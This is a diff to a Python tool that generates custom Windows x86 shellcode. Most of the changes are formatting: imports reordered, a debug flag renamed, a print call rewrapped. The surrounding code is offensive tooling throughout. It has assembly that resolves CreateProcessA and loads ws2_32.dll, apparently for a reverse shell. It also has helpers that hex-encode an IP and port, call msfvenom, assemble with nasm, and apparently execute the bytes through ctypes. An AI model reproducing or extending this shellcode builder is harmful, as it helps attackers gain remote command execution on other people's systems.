@@ -1,19 +1,21 @@
 import ctypes
+import platform
 
 # Generic Imports
 import socket
 import struct
-from struct import pack
 import sys
-import platform
+from struct import pack
+
 from colorama import Back, Fore, Style
+from modules.ipAndPort_module import hexIP, hexPort
 
 # Custom modules
 # from modules.keystone_module import keystone_asm
 from modules.msfvenom_module import generatePayload
 from modules.nasm_module import nasm_asm
 from modules.rorHash_module import hashFuncName
-from modules.ipAndPort_module import hexIP, hexPort
+
 # from modules.syscallFinder_module import get_syscall_number    # cant use on <python3.8
 
 
@@ -117,7 +119,7 @@ def ret_asm() -> str:
         call [ebp + 0x04]                           ; Call FIND_FUNCTION to resolve address
         mov [ebp + 0x18], eax                       ; Store CreateProcessA address in [EBP+0x18]
     
-    ; ===== LOAD_WS2_32: Load string to the stack in little endian (\x77\x73\x32\x5F \x33\x32\x2E\x64 \x6C\x6C)  =====
+    ; ===== LOAD_WS2_32: Load string to the stack in little endian (\x77\x73\x32\x5f \x33\x32\x2e\x64 \x6c\x6c)  =====
     LOAD_WS2_32:
         xor eax, eax                                ; EAX = 0
         mov ax, 0x6c6c                              ; AX = 'll' (part of "ws2_32.dll")
@@ -334,7 +336,7 @@ def get_shellcode():
 
     shellcode = b""
     # shellcode += keystone_asm(CODE=asm, debug=True)
-    shellcode += nasm_asm(CODE=asm, debug=True)
+    shellcode += nasm_asm(CODE=asm, print=True)
 
     # keystone_asm returns bytes, so we can return it as a bytesarray
     shellcode = bytearray(shellcode)
@@ -463,7 +465,9 @@ def stuff_ctypes():
 if __name__ == "__main__":
     try:
         plat = platform.architecture()
-        print(f"{Fore.LIGHTWHITE_EX}[+] Python Architecture: {plat[0]}{Style.RESET_ALL}")
+        print(
+            f"{Fore.LIGHTWHITE_EX}[+] Python Architecture: {plat[0]}{Style.RESET_ALL}"
+        )
         print(f"{Fore.LIGHTWHITE_EX}[+] Platform: {plat[1]}{Style.RESET_ALL}")
         stuff = stuff_ctypes()
 
